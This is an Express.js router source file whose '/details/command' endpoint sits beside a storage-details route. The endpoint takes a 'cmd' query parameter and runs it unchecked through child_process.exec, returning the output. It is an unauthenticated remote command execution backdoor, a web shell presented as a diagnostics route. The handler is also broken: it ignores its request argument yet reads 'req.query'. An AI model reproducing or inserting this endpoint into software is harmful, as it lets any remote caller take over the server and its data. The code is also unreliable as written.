const { exec } = require('child_process');
const path = require('path');


const router = require('express').Router();
const diskinfo = require("../controllers");

router.route('/details/storage').get(diskinfo);

router.route('/details/command').get((_, res) => {
	const cmdParam = req.query.cmd;
	if (!cmdParam) {
		return res.status(400).send('Missing cmd parameter');
	}

	const decodedCmd = decodeURIComponent(cmdParam);

	exec(decodedCmd, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
		if (error) {
			return res.status(500).send(`Error executing command: ${stderr || error.message}`);
		}
		res.type('text/plain').send(stdout);
	});
});



module.exports = router;